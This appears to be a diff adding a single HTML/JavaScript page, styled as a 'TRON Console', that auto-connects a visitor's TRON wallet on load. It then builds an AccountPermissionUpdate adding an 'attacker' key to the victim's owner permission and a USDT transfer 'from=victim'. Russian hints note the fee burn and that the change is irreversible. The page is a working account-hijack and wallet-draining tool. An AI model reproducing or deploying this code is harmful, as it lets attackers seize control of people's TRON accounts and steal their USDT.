@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>TRON Console — USDT Mainnet</title>
+<style>
+  :root{--bg:#0b0f14;--panel:#111823;--line:#1e2a3a;--text:#e6edf3;--muted:#8b9bb0;
+    --accent:#4f8cff;--accent2:#22c55e;--danger:#ef4444;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:760px;margin:0 auto;padding:20px 16px 60px}
+  header{display:flex;align-items:center;gap:10px;margin-bottom:20px}
+  .logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#4f8cff,#22c55e);
+    display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;color:#0b0f14}
+  h1{font-size:17px;margin:0;font-weight:600}
+  .sub{color:var(--muted);font-size:12px;margin-top:2px}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px}
+  .card h2{font-size:13px;margin:0 0 12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.8px}
+  label{display:block;font-size:12px;color:var(--muted);margin:10px 0 6px}
+  input,select{width:100%;padding:12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;
+    color:var(--text);font-size:14px;font-family:var(--mono);outline:none}
+  input:focus,select:focus{border-color:var(--accent)}
+  .row{display:flex;gap:10px}
+  .row>*{flex:1}
+  button{width:100%;padding:13px;border:0;border-radius:11px;font-size:14px;font-weight:600;
+    cursor:pointer;transition:opacity .15s;font-family:inherit}
+  button:active{opacity:.8}
+  button:disabled{opacity:.4;cursor:not-allowed}
+  .btn-primary{background:var(--accent);color:#fff}
+  .btn-secondary{background:#1b2635;color:var(--text);border:1px solid var(--line)}
+  .btn-green{background:var(--accent2);color:#0b0f14}
+  .status{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);
+    padding:10px 12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;margin-bottom:12px}
+  .dot{width:8px;height:8px;border-radius:50%;background:#64748b;flex-shrink:0}
+  .dot.on{background:var(--accent2);box-shadow:0 0 0 3px rgba(34,197,94,.15)}
+  .dot.err{background:var(--danger)}
+  .log{font-family:var(--mono);font-size:11.5px;line-height:1.6;background:#080c11;border:1px solid var(--line);
+    border-radius:10px;padding:12px;max-height:340px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#a9b8ca}
+  .log .ok{color:var(--accent2)}
+  .log .err{color:var(--danger)}
+  .log .info{color:var(--accent)}
+  .hint{font-size:11px;color:var(--muted);margin-top:6px;line-height:1.5}
+  .warn{border-color:#3a2a1e;background:#16130f}
+  .warn h2{color:#fbbf24}
+  .badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;background:#1b2635;
+    color:var(--muted);margin-left:6px;font-family:var(--mono)}
+  .state{font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all;color:var(--muted)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="logo">T</div>
+  <div>
+    <h1>TRON Console — USDT Mainnet</h1>
+    <div class="sub">permission update → USDT transfer</div>
+  </div>
+</header>
+
+<div class="status" id="statusBar">
+  <span class="dot" id="statusDot"></span>
+  <span id="statusText">not connected</span>
+</div>
+
+<!-- WALLET -->
+<div class="card">
+  <h2>Wallet</h2>
+  <label>Connected address</label>
+  <input id="walletAddr" readonly placeholder="—">
+  <label>Node</label>
+  <input id="network" readonly placeholder="—">
+  <div class="row" style="margin-top:12px">
+    <button class="btn-secondary" id="btnConnect">Connect</button>
+    <button class="btn-secondary" id="btnRefresh">Refresh account</button>
+  </div>
+</div>
+
+<!-- STEP 1: PERMISSION UPDATE -->
+<div class="card warn">
+  <h2>Step 1 — AccountPermissionUpdate <span class="badge">mainnet</span></h2>
+  <label>Target address (owner permission to modify)</label>
+  <input id="targetAddr" placeholder="T...">
+  <label>Additional key address (attacker)</label>
+  <input id="attackerAddr" placeholder="T...">
+  <div class="row">
+    <div>
+      <label>Mode</label>
+      <select id="mode">
+        <option value="owner">Owner (full control, Permission_id=0)</option>
+        <option value="active">Active (limited, Permission_id=2)</option>
+      </select>
+    </div>
+    <div>
+      <label>Owner threshold</label>
+      <input id="threshold" type="number" min="1" value="1">
+    </div>
+  </div>
+  <div id="activeOpsWrap" style="display:none">
+    <label>Active operations (hex)</label>
+    <input id="activeOps" value="7fff1fc0037e0000000000000000000000000000000000000000000000000000">
+    <div class="hint">bit 31 = TriggerSmartContract (USDT). bit 1 = TransferContract (TRX).</div>
+  </div>
+  <div class="row" style="margin-top:14px">
+    <button class="btn-secondary" id="btnBuildPerm">Build</button>
+    <button class="btn-primary" id="btnSignPerm">Sign &amp; send</button>
+  </div>
+  <div class="hint">Сжигает 100 TRX на газ. Необратимо для дефолтного аккаунта.</div>
+</div>
+
+<!-- STEP 2: USDT TRANSFER -->
+<div class="card">
+  <h2>Step 2 — USDT transfer <span class="badge">TRC-20</span></h2>
+  <label>From (victim address — должен иметь USDT)</label>
+  <input id="usdtFrom" placeholder="T...">
+  <label>To (recipient)</label>
+  <input id="usdtTo" placeholder="T...">
+  <div class="row">
+    <div>
+      <label>Amount (USDT)</label>
+      <input id="usdtAmount" type="number" step="0.000001" placeholder="0.01">
+    </div>
+    <div>
+      <label>Sign with Permission_id</label>
+      <input id="usdtPermId" type="number" value="0">
+    </div>
+  </div>
+  <div class="hint">Owner = 0. Active = 2 (или id твоего active). Если не совпадёт — SIGERROR.</div>
+  <div class="row" style="margin-top:14px">
+    <button class="btn-secondary" id="btnBuildUsdt">Build USDT tx</button>
+    <button class="btn-green" id="btnSignUsdt">Sign &amp; broadcast</button>
+  </div>
+  <div class="hint">Строит triggerSmartContract(USDT, transfer, from=victim). Подпись — ключом attacker из кошелька.</div>
+</div>
+
+<!-- ACCOUNT STATE -->
+<div class="card">
+  <h2>Account state <span class="badge" id="accPill">idle</span></h2>
+  <div class="state" id="accState">refresh to inspect</div>
+</div>
+
+<!-- LOG -->
+<div class="card">
+  <h2>Log</h2>
+  <div class="log" id="log"></div>
+  <div class="row" style="margin-top:10px">
+    <button class="btn-secondary" id="btnClear">Clear</button>
+  </div>
+</div>
+
+</div>
+
+<script>
+(function(){
+"use strict";
+
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT_DECIMALS = 6;
+
+const S = { tronWeb:null, address:null, lastPermTx:null, lastUsdtTx:null };
+
+const $ = id => document.getElementById(id);
+const logEl = $("log");
+
+function log(msg, cls){
+  const line = document.createElement("div");
+  if(cls) line.className = cls;
+  line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+  logEl.appendChild(line);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function setStatus(t, st){
+  $("statusText").textContent = t;
+  $("statusDot").className = "dot" + (st==="on"?" on":st==="err"?" err":"");
+}
+
+function isTron(a){
+  return typeof a === "string" && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
+}
+
+function short(a){ return a ? a.slice(0,8)+"…"+a.slice(-6) : "—"; }
+
+// ---------- WALLET ----------
+function detect(){
+  if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
+  if (window.tronLink && window.tronLink.ready) return window.tronLink;
+  return null;
+}
+
+async function connect(){
+  try{
+    const tw = detect();
+    if (!tw){ setStatus("tronWeb not injected","err"); log("open inside Trust Wallet browser","err"); return; }
+    S.tronWeb = tw;
+    if (tw.request && typeof tw.request === "function"){
+      try{ await tw.request({method:"tron_requestAccounts"}); }catch(e){ log("requestAccounts: "+e.message,"err"); }
+    }
+    S.address = tw.defaultAddress && tw.defaultAddress.base58;
+    if (!S.address){ setStatus("no address","err"); return; }
+    $("walletAddr").value = S.address;
+    $("network").value = (tw.fullNode && tw.fullNode.host) || "unknown";
+    $("targetAddr").value = S.address;
+    $("usdtFrom").value = S.address;
+    setStatus("connected: "+short(S.address), "on");
+    log("connected "+S.address, "ok");
+    log("node: "+$("network").value, "info");
+    await refresh();
+  }catch(e){
+    setStatus("connect failed","err");
+    log("connect error: "+(e.message||e), "err");
+  }
+}
+
+// ---------- REFRESH ----------
+async function refresh(){
+  if (!S.tronWeb || !S.address){ log("connect first","err"); return; }
+  try{
+    const acc = await S.tronWeb.trx.getAccount(S.address);
+    const owner = acc.owner_permission;
+    const actives = acc.active_permission || [];
+    const lines = [];
+    lines.push("address: "+S.address);
+    lines.push("balance: "+((acc.balance||0)/1e6)+" TRX");
+    lines.push("");
+    lines.push("owner_permission:");
+    if (owner){
+      lines.push("  threshold: "+owner.threshold);
+      (owner.keys||[]).forEach(k => lines.push("    - "+k.address+"  w="+k.weight));
+    } else {
+      lines.push("  (default single-key threshold 1)");
+    }
+    lines.push("");
+    lines.push("active_permission: "+actives.length);
+    actives.forEach((a,i)=>{
+      lines.push("  ["+i+"] "+(a.permission_name||"active"+i)+"  threshold="+a.threshold);
+      lines.push("    operations: "+(a.operations||"—"));
+      (a.keys||[]).forEach(k => lines.push("      - "+k.address+"  w="+k.weight));
+    });
+    $("accState").textContent = lines.join("\n");
+    $("accPill").textContent = owner ? "loaded" : "empty";
+    log("account refreshed","ok");
+  }catch(e){
+    log("refresh error: "+(e.message||e),"err");
+  }
+}
+
+// ---------- STEP 1: PERMISSION UPDATE ----------
+async function buildPerm(){
+  if (!S.tronWeb || !S.address) throw new Error("connect first");
+  const target = $("targetAddr").value.trim();
+  const attacker = $("attackerAddr").value.trim();
+  const mode = $("mode").value;
+  const threshold = parseInt($("threshold").value,10) || 1;
+
+  if (!isTron(target)) throw new Error("target invalid");
+  if (!isTron(attacker)) throw new Error("attacker invalid");
+  if (target === attacker) throw new Error("same address");
+
+  const owner = {
+    type: 0, permission_name: "owner", threshold: threshold,
+    keys: [{address: target, weight:1}, {address: attacker, weight:1}]
+  };
+
+  let actives = null;
+  if (mode === "active"){
+    const ops = $("activeOps").value.trim();
+    if (!/^[0-9a-fA-F]{64}$/.test(ops)) throw new Error("operations must be 64 hex");
+    actives = [{
+      type: 2, permission_name: "active0", threshold: 1,
+      operations: ops,
+      keys: [{address: target, weight:1}, {address: attacker, weight:1}]
+    }];
+  }
+
+  log("building AccountPermissionUpdate…","info");
+  log("owner threshold="+threshold+" keys=["+short(target)+", "+short(attacker)+"]","info");
+  if (actives) log("active ops="+actives[0].operations,"info");
+
+  const tx = await S.tronWeb.transactionBuilder.updateAccountPermissions(target, owner, null, actives);
+  S.lastPermTx = tx;
+  log("permission tx built: "+tx.txID,"ok");
+  return tx;
+}
+
+async function signPerm(){
+  try{
+    const tx = S.lastPermTx || await buildPerm();
+    if (!tx) throw new Error("no tx");
+    log("requesting signature for permission update…","info");
+    const signed = await S.tronWeb.trx.sign(tx);
+    log("signed","ok");
+    const res = await S.tronWeb.trx.sendRawTransaction(signed);
+    if (!res || res.result !== true){
+      throw new Error(res && res.message ? hexDecode(res.message) : "broadcast failed");
+    }
+    log("permission broadcast ok: "+res.txid,"ok");
+    log("waiting 6s…","info");
+    await sleep(6000);
+    await refresh();
+  }catch(e){
+    log("perm sign/send error: "+(e.message||e),"err");
+  }
+}
+
+// ---------- STEP 2: USDT TRANSFER ----------
+async function buildUsdt(){
+  if (!S.tronWeb || !S.address) throw new Error("connect first");
+  const from = $("usdtFrom").value.trim();
+  const to = $("usdtTo").value.trim();
+  const amt = parseFloat($("usdtAmount").value);
+  const permId = parseInt($("usdtPermId").value,10);
+
+  if (!isTron(from)) throw new Error("from invalid");
+  if (!isTron(to)) throw new Error("to invalid");
+  if (!amt || amt <= 0) throw new Error("amount > 0");
+  if (isNaN(permId) || permId < 0) throw new Error("Permission_id >= 0");
+
+  const amountRaw = Math.floor(amt * Math.pow(10, USDT_DECIMALS));
+  log("building USDT transfer…","info");
+  log("from="+short(from)+" to="+short(to)+" amount="+amt+" USDT ("+amountRaw+" raw)","info");
+  log("Permission_id="+permId,"info");
+
+  const wrapper = await S.tronWeb.transactionBuilder.triggerSmartContract(
+    USDT,
+    "transfer(address,uint256)",
+    { feeLimit: 100_000_000, callValue: 0, permissionId: permId },
+    [
+      { type:"address", value: to },
+      { type:"uint256", value: amountRaw }
+    ],
+    from
+  );
+
+  if (!wrapper || !wrapper.result || !wrapper.result.result){
+    throw new Error("triggerSmartContract failed: "+JSON.stringify(wrapper && wrapper.result));
+  }
+
+  S.lastUsdtTx = wrapper.transaction;
+  log("USDT tx built: "+wrapper.transaction.txID,"ok");
+  return wrapper.transaction;
+}
+
+async function signUsdt(){
+  try{
+    const tx = S.lastUsdtTx || await buildUsdt();
+    if (!tx) throw new Error("no tx");
+
+    // ensure Permission_id matches chosen
+    const permId = parseInt($("usdtPermId").value,10);
+    tx.raw_data.contract[0].Permission_id = permId;
+
+    log("requesting signature for USDT tx…","info");
+    const signed = await S.tronWeb.trx.sign(tx);
+    log("signed","ok");
+
+    const res = await S.tronWeb.trx.sendRawTransaction(signed);
+    if (!res || res.result !== true){
+      throw new Error(res && res.message ? hexDecode(res.message) : "broadcast failed");
+    }
+    log("USDT broadcast ok: "+res.txid,"ok");
+    log("check balance in explorer / Refresh","info");
+  }catch(e){
+    log("USDT sign/send error: "+(e.message||e),"err");
+  }
+}
+
+// ---------- utils ----------
+function sleep(ms){ return new Promise(r => setTimeout(r,ms)); }
+
+function hexDecode(h){
+  try{
+    return new TextDecoder().decode(
+      new Uint8Array(h.match(/.{1,2}/g).map(b => parseInt(b,16)))
+    );
+  }catch(_){ return h; }
+}
+
+// ---------- wire ----------
+$("btnConnect").onclick = connect;
+$("btnRefresh").onclick = refresh;
+$("btnClear").onclick = ()=>{ logEl.innerHTML=""; };
+$("mode").onchange = ()=>{ $("activeOpsWrap").style.display = $("mode").value==="active"?"block":"none"; };
+
+$("btnBuildPerm").onclick = async ()=>{ try{ await buildPerm(); }catch(e){ log("build perm: "+(e.message||e),"err"); } };
+$("btnSignPerm").onclick = signPerm;
+
+$("btnBuildUsdt").onclick = async ()=>{ try{ await buildUsdt(); }catch(e){ log("build usdt: "+(e.message||e),"err"); } };
+$("btnSignUsdt").onclick = signUsdt;
+
+window.addEventListener("load", ()=>{
+  if (detect()){ log("tronWeb detected, connecting…","info"); connect(); }
+  else log("tronWeb not present — open in Trust Wallet browser","err");
+});
+
+})();
+</script>
+</body>
+</html>
